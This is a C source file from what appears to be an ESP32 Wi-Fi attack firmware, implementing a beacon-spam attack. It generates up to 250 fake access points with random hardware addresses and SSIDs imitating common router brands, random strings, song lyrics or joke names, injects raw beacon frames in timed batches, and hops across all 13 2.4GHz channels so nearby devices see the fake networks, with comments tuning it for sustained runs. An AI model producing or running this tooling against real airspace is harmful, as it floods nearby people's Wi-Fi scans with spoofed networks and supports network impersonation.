/**
 * @file attack_beacon_spam.c
 * @author SameerAlSahab (sameeralsahab54@gmail.com)
 * @date 8-5-2026
 * @copyright Copyright (c) 2026
 */

#include "attack_beacon_spam.h"
#include "wsl_bypasser.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "esp_log.h"
#include <string.h>

static const char *TAG = "beacon_spam";
static esp_timer_handle_t beacon_timer_handle;

/* The wire protocol's count field (attack_request_t.method, reused for this
 * attack type) is a single byte — 255 is a hard ceiling no matter what.
 * Capped a bit under that instead of pushing to the exact edge. */
#define MAX_SPAM_APS 250
typedef struct {
    uint8_t ssid[33];
    uint8_t ssid_len;
    uint8_t bssid[6];
} spam_ap_t;

static spam_ap_t spam_pool[MAX_SPAM_APS];
static uint16_t active_spam_count = 20;

/* Frames actually injected per timer tick. Calibrated against the deauth
 * path's own proven ceiling (up to 50 small ~26-byte frames per 100ms tick,
 * see DEAUTH_INTENSITY_MAX in attack_method.c) — beacon frames here run up
 * to 128 bytes, several times larger, so a lower per-tick count keeps each
 * burst comfortably inside one tick's real airtime instead of spilling into
 * the next and backing up the driver's TX queue. Kept deliberately
 * conservative (not just "as high as seemed to work") because this needs to
 * hold up over minutes of continuous running, not just look good in a
 * quick test — see the self-check in timer_send_beacon() below. */
#define BEACON_BATCH_SIZE 20
/* Rotating cursor into spam_pool — see timer_send_beacon(). */
static uint16_t spam_offset = 0;

/* Without hopping, every fake AP only ever broadcasts on whatever single
 * channel the radio happened to be on — a phone scanning a different
 * channel never sees any of them no matter how many are configured. Hop
 * across all 13 2.4GHz channels instead so the spam actually covers the
 * spectrum a real scan sweeps. Since there's only one radio, this moves the
 * management AP's channel right along with it — same trade-off Deauth/Evil
 * Twin/Multi-Clone already make, so attack_beacon_spam_start()/_stop() now
 * bring the management AP down/back up too (see attack.c). */
#define BEACON_HOP_CHANNELS       13
#define BEACON_HOP_EVERY_N_TICKS  10   /* ~1s of dwell per channel at the 100ms tick rate */
static uint8_t  beacon_channel     = 1;
static uint16_t beacon_hop_counter = 0;


static const char *base_names[] = { "TP-Link", "Linksys", "Netgear", "ASUS", "D-Link", "Home", "Office", "Starlink", "EastWest" };
static const char *suffixes[] = { "_WiFi", "-Guest", "-5G", "_Secure", "" };
static const char *emojis[] = { "🔥","📶","🚀","✨","⚡" };


static const char *rick_lyrics[] = {
    "Never Gonna Give You Up", "Never Gonna Let You Down",
    "Never Gonna Run Around", "And Desert You",
    "Never Gonna Make You Cry", "Never Gonna Say Goodbye",
    "Never Gonna Tell A Lie", "And Hurt You"
};


static const char *troll_names[] = {
    "FBI Surveillance Van 04", "Virus.exe", "Get Off My LAN",
    "Free Public WiFi", "Loading...", "Searching...", "Click for virus"
};

static void generate_ssid_by_mode(uint8_t *ssid, uint8_t *length, beacon_spam_mode_t mode, int index) {
    char final[33] = {0};

    switch(mode) {
        case BEACON_MODE_COMMON: {
            int b = esp_random() % (sizeof(base_names)/sizeof(base_names[0]));
            int s = esp_random() % (sizeof(suffixes)/sizeof(suffixes[0]));
            snprintf(final, sizeof(final), "%s%s", base_names[b], suffixes[s]);
            if ((esp_random() % 100) < 10) {
                strncat(final, emojis[esp_random()%5], sizeof(final)-strlen(final)-1);
            }
            break;
        }
        case BEACON_MODE_GARBAGE: {
            const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;";
            int len = 8 + (esp_random() % 12);
            for (int i = 0; i < len; i++) final[i] = charset[esp_random() % (sizeof(charset)-1)];
            break;
        }
        case BEACON_MODE_RICK_ROLL: {
            strncpy(final, rick_lyrics[index % (sizeof(rick_lyrics)/sizeof(rick_lyrics[0]))], 32);
            break;
        }
        case BEACON_MODE_SECURITY: {
            strncpy(final, troll_names[index % (sizeof(troll_names)/sizeof(troll_names[0]))], 32);
            break;
        }
    }

    size_t len = strlen(final);
    if (len > 32) len = 32;
    memcpy(ssid, final, len);
    *length = len;
}

/* Sends one BATCH of the pool per tick instead of the whole pool every
 * time. With a large count (e.g. 200), blasting all of them back-to-back in
 * a single 100ms window used to take far longer than 100ms of real airtime
 * to actually transmit, so esp_timer's next tick would fire before the
 * previous burst finished — the TX queue backs up and only the
 * early-indexed APs in the loop ever reliably go out, which is exactly why
 * a phone scan only ever showed a handful of the configured networks no
 * matter how high the count was set. Round-robining a fixed, calibrated
 * batch guarantees every configured AP gets its own dedicated tick(s)
 * within a bounded, predictable cycle time instead of fighting over one
 * oversized burst. */
/* Timing budget for one tick, in microseconds. Kept as a named constant so
 * the self-check below and esp_timer_start_periodic() can't drift apart. */
#define BEACON_TICK_US 100000

static void timer_send_beacon(void *arg) {
    /* Only touch the radio's channel right at the start of a new dwell
     * period, not every tick — a channel switch has its own settling cost,
     * and calling it once per second instead of ten times a second is both
     * cheaper and enough for a scanning device to actually catch us there. */
    if (beacon_hop_counter == 0) {
        esp_wifi_set_channel(beacon_channel, WIFI_SECOND_CHAN_NONE);
    }
    beacon_hop_counter++;
    if (beacon_hop_counter >= BEACON_HOP_EVERY_N_TICKS) {
        beacon_hop_counter = 0;
        beacon_channel = (beacon_channel % BEACON_HOP_CHANNELS) + 1;
    }

    int64_t t0 = esp_timer_get_time();
    uint16_t n = active_spam_count < BEACON_BATCH_SIZE ? active_spam_count : BEACON_BATCH_SIZE;
    for (uint16_t i = 0; i < n; i++) {
        uint16_t idx = spam_offset % active_spam_count;
        wsl_bypasser_send_beacon_frame(spam_pool[idx].bssid, spam_pool[idx].ssid, spam_pool[idx].ssid_len, beacon_channel);
        spam_offset++;
    }

    /* Self-diagnostic instead of a guessed-and-hoped-for batch size: if a
     * batch is actually eating most of its tick's time budget, that's the
     * real, hardware-measured signal (not a rough estimate) that
     * BEACON_BATCH_SIZE is too high for reliable long-run operation and
     * should be turned down. Rate-limited so it can't itself become a
     * source of overhead during a long run. */
    int64_t elapsed_us = esp_timer_get_time() - t0;
    if (elapsed_us > (BEACON_TICK_US * 8) / 10) {
        static int64_t last_warn_at = 0;
        if (t0 - last_warn_at > 5000000) {
            ESP_LOGW(TAG, "Beacon batch took %lldms of a %dms tick — lower the fake-network count if scans look inconsistent",
                     (long long) (elapsed_us / 1000), BEACON_TICK_US / 1000);
            last_warn_at = t0;
        }
    }
}

void attack_beacon_spam_start(uint8_t count, beacon_spam_mode_t mode) {
    active_spam_count = (count > 0 && count <= MAX_SPAM_APS) ? count : 20;
    spam_offset = 0;
    beacon_channel = 1;
    beacon_hop_counter = 0;

    for (int i = 0; i < active_spam_count; i++) {
        generate_ssid_by_mode(spam_pool[i].ssid, &spam_pool[i].ssid_len, mode, i);
        for (int j = 0; j < 6; j++) spam_pool[i].bssid[j] = esp_random() & 0xFF;
        spam_pool[i].bssid[0] = (spam_pool[i].bssid[0] & 0xFE) | 0x02;
    }

    const esp_timer_create_args_t args = { .callback = &timer_send_beacon };
    esp_timer_create(&args, &beacon_timer_handle);
    /* 100ms tick — same interval already proven stable for the deauth path's
     * own periodic timer. Kept generous on purpose: this needs to survive
     * minutes of continuous running, and there's headroom to safely lower
     * later (watch for the self-check warning above) rather than tune
     * purely from an untested guess. */
    esp_timer_start_periodic(beacon_timer_handle, BEACON_TICK_US);
    uint32_t cycle_ms = ((active_spam_count + BEACON_BATCH_SIZE - 1) / BEACON_BATCH_SIZE) * (BEACON_TICK_US / 1000);
    uint32_t spectrum_sweep_ms = BEACON_HOP_CHANNELS * BEACON_HOP_EVERY_N_TICKS * (BEACON_TICK_US / 1000);
    ESP_LOGI(TAG, "Beacon spam started. Mode: %d, %u APs, full pool cycle ~%lums, full %d-channel sweep ~%lums",
             mode, active_spam_count, (unsigned long) cycle_ms, BEACON_HOP_CHANNELS, (unsigned long) spectrum_sweep_ms);
}

void attack_beacon_spam_stop() {
    if (beacon_timer_handle) {
        esp_timer_stop(beacon_timer_handle);
        esp_timer_delete(beacon_timer_handle);
        beacon_timer_handle = NULL;
    }
    ESP_LOGI(TAG, "Beacon spam stopped.");
}
